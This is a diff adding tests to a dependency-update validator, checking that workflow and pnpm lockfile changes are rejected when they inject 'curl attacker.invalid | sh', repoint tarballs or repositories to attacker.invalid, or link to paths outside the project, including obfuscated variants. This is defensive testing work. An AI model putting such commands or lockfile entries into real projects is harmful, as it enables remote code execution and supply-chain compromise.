@@ -23,6 +23,16 @@ test("action digest updates cannot change workflow commands, permissions or acti
   for (const changed of [updated.replace("permissions: {}", "permissions: write-all"), updated.replace("actions/checkout", "attacker/checkout"), updated + "run: curl attacker.invalid | sh\n", updated.replace("v7.0.2", "v8.0.0")]) assert.throws(() => validateDependencyFile(".github/workflows/ci.yml", source, changed));
 });
 
+test("unchanged registry deprecation links are metadata; new lockfile download sources still require review", () => {
+  const source = "lockfileVersion: '9.0'\npackages:\n  example@1.2.3:\n    resolution: {integrity: sha512-example}\n    deprecated: See https://example.invalid/support for supported versions.\n";
+  const updated = source.replace("example@1.2.3", "example@1.2.4");
+  validateDependencyFile("web/pnpm-lock.yaml", source, updated);
+  const actual = readFileSync("web/pnpm-lock.yaml", "utf8");
+  validateDependencyFile("web/pnpm-lock.yaml", actual, actual.replaceAll("knip@6.42.0", "knip@6.42.1"));
+  for (const changed of [updated + "    tarball: https://attacker.invalid/pkg.tgz\n", updated.replace("integrity: sha512-example", "integrity: sha512-example, tarball: https://attacker.invalid/pkg.tgz"), updated.replace("https://example.invalid/support", "https://attacker.invalid/new-warning"), updated + "    version: link:../../outside\n", updated + "    version: link:../core-evil\n", updated + "    version: file:../../outside\n"]) assert.throws(() => validateDependencyFile("web/pnpm-lock.yaml", source, changed));
+  for (const addition of ['    resolution: {"tarball": "//attacker.invalid/pkg.tgz"}\n', '    resolution: {repo: attacker/pkg, commit: abc}\n', '    source: HTTPS://attacker.invalid/pkg.tgz\n', '    source: ssh://attacker.invalid/pkg\n', '    key: &download tarball\n    resolution: {*download: "//attacker.invalid/pkg.tgz"}\n', '    source: "\\u0068ttps://attacker.invalid/pkg.tgz"\n']) assert.throws(() => validateDependencyFile("web/pnpm-lock.yaml", source, updated + addition));
+});
+
 test("a lock refresh cannot replace an upstream repository or download host", () => {
   const source = readFileSync("tools/security/runtime.lock", "utf8");
   const updated = source.replaceAll("0.18.0", "0.18.1");
